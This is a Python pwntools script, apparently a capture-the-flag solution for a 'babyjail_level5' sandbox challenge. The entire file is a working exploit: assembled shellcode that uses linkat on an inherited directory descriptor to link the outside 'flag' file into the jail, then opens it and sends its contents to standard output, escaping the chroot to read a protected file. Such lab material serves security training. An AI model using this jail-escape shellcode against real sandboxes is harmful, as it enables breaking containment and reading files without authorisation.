import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

with pwn.process(["/challenge/babyjail_level5", "/"]) as target:
    pwn.info(target.readrepeat(1))


    target.send(pwn.asm(f"""
    {pwn.shellcraft.pushstr("flag")}
    mov rsi, rsp
    {pwn.shellcraft.linkat(3, "rsi", -100, "abc", 0)}

    {pwn.shellcraft.open("/abc", 0)}

    {pwn.shellcraft.sendfile(1, 4, 0, 1024)}
    """))

    pwn.info(target.readrepeat(1))